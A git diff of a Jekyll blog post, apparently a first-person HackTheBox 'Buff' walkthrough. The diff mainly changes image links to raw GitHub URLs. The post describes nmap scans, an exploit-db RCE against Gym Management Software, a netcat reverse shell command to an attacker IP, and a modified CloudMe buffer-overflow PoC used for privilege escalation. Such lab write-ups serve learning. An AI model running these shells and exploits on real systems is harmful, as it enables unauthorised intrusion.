@@ -1,18 +1,13 @@
 --
 layout: post
 title: HackTheBox Buff walktthrough
-# subtitle: Each post also has a subtitle
-# gh-repo: daattali/beautiful-jekyll
-# gh-badge: [star, fork, follow]
 tags: [enumeration, hackthebox, netcat, plink, powershell, windows]
 comments: true
 ---
 
-# Buff HackTheBox walktthrough
-
 ## Introduction
 
-![info_cart.png](_resources/3da2ee768f774733bb773b4d7ce5b828.png)
+![info_cart.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/3da2ee768f774733bb773b4d7ce5b828.png)
 
 Buff is a machine on [HackTheBox](https://www.hackthebox.eu/) platform with the IP address 10.10.10.198. The machine is vulnerable to multiple CVE which are easy to find. The machine has been rated Easy by the community. When I wrote this walkthrough, Buff wasn't retired yet. Please don't cheat and solve the box by yourself if you didn't get root flag. The purpose of HacktTheBox is to learn and trying by yourself is the best way to do it.
 
@@ -20,38 +15,38 @@ Buff is a machine on [HackTheBox](https://www.hackthebox.eu/) platform with the 
 Well, it started with several nmap scan to enumerate ports.
 
 
-![fast_scan.png](_resources/8339a19328d74135ac616fd838f2a1ca.png)
+![fast_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8339a19328d74135ac616fd838f2a1ca.png)
 
 I browser to the HTTP proxy and did a full TCP port scan in the background in case I've been missing something important.
 
 
 
-![full_nmap.png](_resources/547e0902b8a04e2ca0c3a96acaa966fe.png)
+![full_nmap.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/547e0902b8a04e2ca0c3a96acaa966fe.png)
 
 
 Did a last scan to enumerate the version of the services I found.
 
 
 
-![detail_nmap.png](_resources/348e061499bc40cc8f40b2e155662970.png)
+![detail_nmap.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/348e061499bc40cc8f40b2e155662970.png)
 
 
-![index_page.png](_resources/47b1d92d2c4d4785b3d3f9b5002627d4.png)
+![index_page.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/47b1d92d2c4d4785b3d3f9b5002627d4.png)
 
 The first thing I tried to find were the technologies they used and their versions so I can search for CVE later. What does the application do? What language is it written in? What server software is the application running on? Do they use a CMS ?
 
 Most of those questions were answered by poking around.
 
-![contact_page.png](_resources/2e368b62d2cf4caebe60de2e5b9ec0a3.png)
+![contact_page.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/2e368b62d2cf4caebe60de2e5b9ec0a3.png)
 
 
-![inspectorpng.png](_resources/155c34a5c1714eb4a049befe3ff90dbe.png)
+![inspectorpng.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/155c34a5c1714eb4a049befe3ff90dbe.png)
 
 ## Foothold
 
 I googled "Gym management Software 1.0" for exploits and get an unauthenticated [Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/48506).
 
-![shaun_shell.png](_resources/6c57f1e511e74ee5ad430fe7597fe642.png)
+![shaun_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/6c57f1e511e74ee5ad430fe7597fe642.png)
 
 Now I can execute command on the server as user Shaun but it's not really convenient because I don't have proper shell. Shaun is an unprivileged user and I need to get an Administrator account to fully control the machine. The next step would be to enumerate the machine to find a way to elevate my privilege but let's get a shell first.
 
@@ -59,7 +54,7 @@ Now I can execute command on the server as user Shaun but it's not really conven
 
 I created a python web server to extend the folder of the file I wanted to upload on the server.
 
-![local_http_server.png](_resources/9e8822b28ea047eebc5fce2fbad00451.png)
+![local_http_server.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9e8822b28ea047eebc5fce2fbad00451.png)
 
 Executed the command below to download the file from my machine with the right IP address.
 ```powershell
@@ -71,7 +66,7 @@ I upload the first version of Netcat on the server since this version has an opt
 
 Opened the port 1234 for incoming connection and execute `nc.exe X.X.X.X 1234 -e cmd.exe` with your ip address to establish the reverse shell connection.
 
-![listen_1234.png](_resources/9d1a53b7cddc40cfb5c063c935153ec8.png)
+![listen_1234.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9d1a53b7cddc40cfb5c063c935153ec8.png)
 
 
 
@@ -104,7 +99,7 @@ The executable open the port 8888 on the loopback interface (127.0.0.1), unfortu
 
 I downloaded a [POC from exploit-db](https://www.exploit-db.com/exploits/48389) and modified the payload. 
 
-```Python
+```python
 # Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
 # Date: 2020-04-27
 # Exploit Author: Andy Bowden
@@ -163,7 +158,7 @@ except Exception as e:
 I executed it and got a shell as Administrator.
 
 
-![root_shell.png](_resources/c2ee9ee649634840b89d70f9ca4b2ccd.png)
+![root_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/c2ee9ee649634840b89d70f9ca4b2ccd.png)
 
 And that’s how I did Buff. This is my first walkthrough, others will be coming soon. I hope you learn something. See you till the next write up.
 
